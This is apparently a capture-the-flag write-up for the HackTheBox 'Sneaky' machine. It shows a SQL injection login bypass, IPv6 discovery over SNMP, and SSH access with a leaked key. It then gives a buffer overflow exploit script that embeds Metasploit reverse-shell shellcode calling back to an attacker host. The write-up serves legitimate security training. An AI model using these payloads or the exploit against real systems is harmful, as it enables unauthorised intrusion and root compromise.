# Sneaky - 10.10.10.20

# Enum

Running nmap only returns port 80. The website page reads "Under development".

```
root@kingpin:~# dirb http://10.10.10.20 /usr/share/wordlists/dirb/common.txt

---- Scanning URL: http://10.10.10.20/ ----
==> DIRECTORY: http://10.10.10.20/dev/  
```
 Now in ``/dev`` there is a login page. Let's try good old SQLi
 ```
 POST /dev/login.php HTTP/1.1
 Host: 10.10.10.20

 name=admin&pass='or '1'='1
```
This takes us to the following page containing a username and an [SSH key](https://github.com/leolashkevych/CTF/blob/master/Hackthebox.eu/Machines/Sneaky%20-%2010.10.10.20/ssh.key).
```html
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
     "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
 <html xml:lang="ja" xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <title>DevWebsite</title>
 </head>
 <body>
 <h1>DevWebsite Login</h1>
 <dt>
 <dl>name: admin</dl>
 </dt>
 <dt>
 <dl>name: thrasivoulos</dl>
 </dt>
 <center><a href="sshkeyforadministratordifficulttimes">My Key</a></center>
 <center>Noone is ever gonna find this key :P</center>
 </body>
 </html>
 ```
## Wait a sec

There is [SSH key](https://github.com/leolashkevych/CTF/blob/master/Hackthebox.eu/Machines/Sneaky%20-%2010.10.10.20/ssh.key) included on the webpage, however it was not discovered by nmap. Why could it be?

One possibility is that ssh is open for ipv6. To verify it, we have to obtain the address and it can be done via [SNMP](https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi736DDoszXAhVC1GMKHbcWCiYQFggoMAA&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSimple_Network_Management_Protocol&usg=AOvVaw0BknA85sHxVp46EyvjTrIF), since it is up.
```
nmap -sU -n -sC 10.10.10.20

PORT	STATE SERVICE
161/udp open  snmp
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: fcf2da02d0831859
|   snmpEngineBoots: 7
|_  snmpEngineTime: 1d13h06m46s
```
```
root@kingpin:~#snmpwalk -v2c -c public 10.10.10.20
....
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.20 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.170.145.203 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.170.145.203 = INTEGER: 2
...
```
So ``222.173.190.239.0.0.0.0.2.80.86.255.254.170.145.203`` converts to ``de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:aa:91:cb``.

Now we can confirm the ipv6 assumption and try to log in with the key.
```
root@kingpin:~# nmap -n -6 dead:beef::250:56ff:feaa:91cb

Nmap scan report for dead:beef::250:56ff:feaa:91cb
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

root@kingpin:~# ssh -i ssh.key thrasivoulos@dead:beef::250:56ff:feaa:91cb
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat Nov 18 20:34:30 EET 2017

  System load:  0.0           	Processes:       	159
  Usage of /:   9.9% of 18.58GB   Users logged in: 	0
  Memory usage: 9%            	IP address for eth0: 10.10.10.20
  Swap usage:   0%

  Graph this data and manage this system at:
	https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sat Nov 18 20:34:31 2017 from dead:beef:2::1193
thrasivoulos@Sneaky:~$

```

## Privesc

First off, lets do some basic enum and check if any root files have a sticky bit. Got a hit so run it with some args.
```
thrasivoulos@Sneaky:~$ find / -perm -4000 2>/dev/null
...
/usr/local/bin/chal
...

thrasivoulos@Sneaky:~$ /usr/local/bin/chal AAAAAAAAAA
thrasivoulos@Sneaky:~$ /usr/local/bin/chal AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
thrasivoulos@Sneaky:~$ /usr/local/bin/chal AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
thrasivoulos@Sneaky:~$ /usr/local/bin/chal AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Sweet, got a seg fault, so there is a possibility for buffer overflow.

Some things to figure out:
- Buffer size
- Generate shellcode
- Address for EIP

### Create a pattern to determine buffer size.
```
root@kingpin:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```
Running the program with this as an argument returns ``Program received signal SIGSEGV, Segmentation fault.
0x316d4130 in ?? ()``
```
root@kingpin:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316d4130
[*] Exact match at offset 362
```

So the buffer size is 362 bytes.

### Generating shellcode.
```ruby
msf payload(shell_reverse_tcp) > generate
# linux/x86/shell_reverse_tcp - 68 bytes
# http://www.metasploit.com
# VERBOSE=false, LHOST=10.10.15.48, LPORT=4444,
# ReverseAllowProxy=false, StagerRetryCount=10,
# StagerRetryWait=5.0, ReverseListenerThreaded=false,
# PrependFork=false, PrependSetresuid=false,
# PrependSetreuid=false, PrependSetuid=false,
# PrependSetresgid=false, PrependSetregid=false,
# PrependSetgid=false, PrependChrootBreak=false,
# AppendExit=false, InitialAutoRunScript=, AutoRunScript=,
# CMD=/bin/sh
buf =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x0a\x0f" +
"\x30\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3" +
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f" +
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
```

### Determining address for EIP

- open the binary in gdb
- ``r $(pyhon -c "'\x90'*362 + 'AAAA'")``
- get a seg fault
- print stack with ``x/300x $esp-350``
- pick an offset that will hopefully hit the [NOP sled](https://en.wikipedia.org/wiki/NOP_slide) (e.g 0xbffff3e0)

### Putting all together

Simple python script to output the payload.

```python
payload_size=362
buf = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"+"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x0a\x0f"+"\x30\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3"+"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"+"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
nop = "\x90"*(payload_size-len(buf))
eip = "\xe0\xf3\xff\xbf" #converting 0xbffff3e0 to little endian
print nop+buf+eip
```

Run the app with the payload aaaaaaaand :tada:
```
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
# ls /root/    
root.txt
```
